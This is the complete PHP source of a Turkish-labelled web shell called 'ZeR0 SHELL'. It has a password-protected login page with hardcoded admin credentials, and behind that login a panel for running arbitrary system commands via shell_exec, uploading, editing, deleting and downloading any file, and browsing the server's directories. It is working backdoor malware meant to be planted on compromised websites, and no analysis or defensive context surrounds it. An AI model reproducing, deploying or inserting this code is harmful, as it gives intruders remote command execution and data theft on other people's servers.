<?php
session_start();
header("Content-Type: text/html; charset=UTF-8");
mb_internal_encoding("UTF-8");
@error_reporting(0);
@set_time_limit(0);
@ini_set("display_errors", 0);

$login_success = false;

if($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['username'], $_POST['password'], $_POST['role'])) {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $role = $_POST['role'];
    if(($user === 'admin' && $pass === 'zer0!.' && $role==='admin') ||
       ($user === 'super' && $pass === 'supzer0' && $role==='superadmin')){
        $login_success = true;
        $_SESSION['logged_in'] = true;
    } else {
        $login_error = "Hatalı kullanıcı veya şifre!";
    }
}

if(isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    $login_success = true;
}

if(!$login_success):
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SHELL PANEL - Login</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
body {
    height: 100vh;
    margin: 0;
    background-image: url('https://i.pinimg.com/1200x/65/b5/02/65b502b28e3d70126e1ba63e34659fc2.jpg');
    background-repeat: no-repeat;
    background-position: center top;
    background-attachment: fixed;
    background-size: 110% 110%;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Arial', sans-serif;
}

.login-container {
    background: rgba(43,43,43,0.95);
    border-radius: 10px;
    width: 600px;
    box-shadow: 0 0 25px rgba(168,255,96,0.7), 0 0 50px rgba(168,255,96,0.4);
    display: flex;
    overflow: hidden;
    animation: glow 2s infinite alternate;
}
@keyframes glow {
    from { box-shadow: 0 0 15px rgba(168,255,96,0.5), 0 0 30px rgba(168,255,96,0.2);}
    to   { box-shadow: 0 0 25px rgba(168,255,96,0.9), 0 0 50px rgba(168,255,96,0.5);}
}
.login-left, .login-right {
    padding: 30px;
    flex: 1;
}
.login-left {
    border-right: 1px solid #444;
}
.login-left h2 {
    color: #a8ff60;
    margin-bottom: 20px;
    font-size: 22px;
    text-align: center;
}
.form-check-label {
    color: #a8ff60;
    margin-right: 15px;
}
input.form-control {
    background: #1c1c1c;
    border: 1px solid #555;
    color: #a8ff60;
    margin-bottom: 15px;
}
input.form-control:focus {
    box-shadow: 0 0 5px #a8ff60;
    border-color: #a8ff60;
}
button.btn-login {
    background: #007700;
    color: #fff;
    font-weight: bold;
    width: 100%;
}
button.btn-login:hover {
    background: #005500;
}
.login-right {
    display: flex;
    justify-content: center;
    align-items: center;
    color: #a8ff60;
    text-align: center;
}
.login-right svg {
    width: 80px;
    height: 80px;
    margin-bottom: 10px;
    stroke: #a8ff60;
}
a {
    color: #a8ff60;
}
</style>
</head>
<body>
<div class="login-container">
    <div class="login-left">
        <h2>SHELL PANEL</h2>
        <form method="POST">
            <div class="form-check form-check-inline">
                <input class="form-check-input" type="radio" name="role" id="admin" value="admin" checked>
                <label class="form-check-label" for="admin">Admin</label>
            </div>
            <div class="form-check form-check-inline">
                <input class="form-check-input" type="radio" name="role" id="superadmin" value="superadmin">
                <label class="form-check-label" for="superadmin">Super Admin</label>
            </div>
            <input type="text" class="form-control" name="username" placeholder="User Name" required>
            <input type="password" class="form-control" name="password" placeholder="Password" required>
            <button type="submit" class="btn btn-login">LOGIN</button>
            <p class="mt-2"><a href="#" style="text-decoration:underline;">Reset Password</a></p>
        </form>
        <?php if(isset($login_error)) echo "<p style='color:#ff4444;'>$login_error</p>"; ?>
    </div>
    <div class="login-right">
        <div>
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" d="M12 11c.667 0 1 .333 1 1v2h-2v-2c0-.667.333-1 1-1z"/>
                <path stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" d="M4 11V7a8 8 0 1116 0v4"/>
                <rect x="4" y="11" width="16" height="10" rx="2" stroke="currentColor"/>
            </svg>
            <h3>ZER0</h3>
            <p style="font-size:12px; color:#a8ff60;">©2025 ZER0 Security, Inc. All Rights Reserved.</p>
        </div>
    </div>
</div>
</body>
</html>
<?php else: ?>
<?php
/* === ZeR0 SHELL Başlangıcı === */
$rootPath = realpath($_SERVER['DOCUMENT_ROOT']);
if(!$rootPath) $rootPath = getcwd();
$cwd = isset($_GET['d']) ? $_GET['d'] : $rootPath;

@chdir($cwd);
$cwd = getcwd();
$files = @scandir($cwd);

/* === CMD Panel === */
if (isset($_GET['cmd'])) {
    $out = shell_exec($_POST['command']." 2>&1");
    @ob_clean(); @flush();
    echo "<textarea style='width:100%;height:300px;'>$out</textarea>";
    exit;
}

/* === Upload === */
if (isset($_GET['upload']) && isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}

/* === Silme === */
if (isset($_GET['sil'])) {
    $t = $_GET['sil'];
    if (is_file($t)) unlink($t);
    elseif (is_dir($t)) rmdir($t);
}

/* === Düzenleme === */
if (isset($_GET['edit'])) {
    if (isset($_POST['content'])) {
        file_put_contents($_GET['edit'], $_POST['content']);
        echo "<script>alert('Kaydedildi!');window.location='?d=$cwd';</script>";
        exit;
    }
    echo "<form method=post><textarea name=content style='width:100%;height:400px;'>".htmlspecialchars(file_get_contents($_GET['edit']))."</textarea><br><input type=submit value='Kaydet'></form>";
    exit;
}

/* === İndir === */
if (isset($_GET['indir'])) {
    $file = $_GET['indir'];
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"".basename($file)."\"");
    readfile($file);
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>ZeR0 SHELL</title>
<style>
body { background:#111; color:#eee; font-family:monospace; }
a { color:#6cf; text-decoration:none; } a:hover { text-decoration:underline; }
table { width:100%; border-collapse:collapse; }
td, th { padding:6px; border:1px solid #333; }
th:nth-child(3), td:nth-child(3) { width:60px; text-align:center; }
input[type=file], input[type=text], textarea { background:#222; color:#0f0; border:1px solid #555; padding:4px; width:100%; }
.upload-box { margin:15px 0; display:flex; gap:10px; align-items:center; }
.custom-file-upload { display:inline-block; padding:8px 14px; cursor:pointer; background:#222; border:1px solid #555; border-radius:6px; color:#0f0; font-weight:bold; transition:.3s; }
.custom-file-upload:hover { background:#333; border-color:#0f0; color:#fff; }
.custom-file-upload input[type=file] { display:none; }
.btn { padding:8px 14px; background:#0f0; border:none; border-radius:6px; font-weight:bold; cursor:pointer; color:#111; transition:.3s; }
.btn:hover { background:#6cf; color:#000; }
.zer0-title { font-family:monospace; font-size:38px; text-align:center; margin:20px 0; color:#0f0; text-shadow:0 0 8px #0f0,0 0 16px #0f0,0 0 24px #0f0; animation:flicker 2s infinite alternate,glow 1.5s infinite alternate; }
@keyframes flicker {0%{opacity:1}10%{opacity:.8}20%{opacity:1}30%{opacity:.6}40%{opacity:1}50%{opacity:.7}60%{opacity:1}70%{opacity:.9}80%{opacity:1}90%{opacity:.85}100%{opacity:1}}
@keyframes glow {from{text-shadow:0 0 8px #0f0,0 0 16px #0f0,0 0 24px #6cf;} to{text-shadow:0 0 12px #6cf,0 0 20px #0f0,0 0 28px #f0f;}}
</style>
</head>
<body>

<h1 class="zer0-title"> ZeR0 SHELL </h1>

<!-- Yukarı Butonu ve HTML Editör -->
<div style="margin:20px 0; text-align:center;">
<form method="POST">
    <textarea name="amp_html" style="width:80%;height:200px;" placeholder="Buraya HTML kodunu yaz"></textarea><br><br>
    <button type="submit" class="btn">⬆️ Kaydet ve AMP oluştur</button>
</form>
</div>

<h2>📁 Dizin: <?=htmlspecialchars($cwd)?></h2>

<form method="POST" enctype="multipart/form-data" action="?d=<?=urlencode($cwd)?>&upload" class="upload-box">
    <label class="custom-file-upload">
        <input type="file" name="f">
        📂 Dosya Seç
    </label>
    <button type="submit" class="btn">⬆️ Upload</button>
</form>

<table>
<tr><th>Dosyalar</th><th>Boyut</th><th>Dosya İzinleri</th><th>Düzenleme</th></tr>
<?php
$folders = [];
$filesArr = [];

foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = $cwd . DIRECTORY_SEPARATOR . $f;
    if (is_dir($path)) $folders[] = $f;
    else $filesArr[] = $f;
}

sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
sort($filesArr, SORT_NATURAL | SORT_FLAG_CASE);
$files = array_merge($folders, $filesArr);

foreach ($files as $f) {
    $path = $cwd . DIRECTORY_SEPARATOR . $f;
    echo "<tr>";
    echo "<td>".(is_dir($path) ? "<a href='?d=".urlencode(realpath($path))."'>📂 $f</a>" : "📄 $f")."</td>";
    echo "<td>".(is_file($path) ? filesize($path)." B" : "-")."</td>";
    echo "<td>".(is_writable($path)?"🟢":"🔴")."</td>";
    echo "<td>";
    if (is_file($path)) {
        echo "<a href='?d=$cwd&edit=".urlencode($path)."'>Düzenle</a> | ";
        echo "<a href='?d=$cwd&indir=".urlencode($path)."'>İndir</a> | ";
    }
    echo "<a href='?d=$cwd&sil=".urlencode($path)."' onclick='return confirm(\"Sil $f?\")'>Sil</a>";
    echo "</td></tr>";
}
?>
</table>

<h3>CMD Panel</h3>
<form method="POST" action="?cmd" onsubmit="runCmd(this); return false;">
    <input type="text" name="command" id="cmd" placeholder="whoami && uname -a">
    <input type="submit" value="Run">
</form>
<iframe name="out" style="width:100%;height:300px;background:#000;color:#0f0;border:1px solid #444;"></iframe>

<script>
function runCmd(form){
    const fd = new FormData(form);
    fetch('?cmd', {method: 'POST', body: fd})
        .then(r => r.text())
        .then(t => {
            const f = document.querySelector('iframe').contentWindow.document;
            f.open(); f.write(t); f.close();
        });
}
</script>

</body>
</html>
<?php endif; ?>
